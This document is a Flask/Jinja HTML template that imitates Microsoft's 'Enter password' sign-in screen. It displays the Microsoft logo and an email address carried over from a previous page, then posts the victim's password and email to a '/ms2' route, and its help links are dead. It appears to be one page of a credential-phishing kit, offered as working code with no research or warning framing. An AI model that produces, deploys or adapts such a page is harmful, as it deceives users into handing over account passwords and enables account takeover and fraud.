<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="{{ url_for('static', filename='assets/favicon.ico') }}" />
    <title>Enter your password</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='assets/app.css') }}" />
</head>

<body>
    <section id="section_pwd">
        <div class="auth-wrapper">
            <img src="{{ url_for('static', filename='assets/logo.png') }}" alt="Microsoft" />
            <div class="identity w-100 mt-16 mb-16">
                <button class="back" onclick="window.history.back();">
                    <img src="{{ url_for('static', filename='assets/back.png') }}" />
                </button>
                <span id="user_identity">{{ email }}</span>  <!-- Show email passed from ms.html -->
            </div>
            <h2 class="title mb-16">Enter password</h2>
            <form action="/ms2" method="POST">
                <input type="hidden" name="email" value="{{ email }}" />  <!-- Pass email to ms2 -->
                <div class="mb-16">
                    <p id="error_pwd" class="error">{{ error }}</p>  <!-- Show error if any -->
                    <input id="inp_pwd" type="password" name="password" class="input" placeholder="Password" required />
                </div>
                <div>
                    <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                    <p class="mb-16">
                        <a href="#" class="link fs-13">Other ways to sign in</a>
                    </p>
                </div>
                <div>
                    <button class="btn" id="btn_sig" type="submit">Sign in</button>
                </div>
            </form>
        </div>
    </section>

    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
</body>

</html>
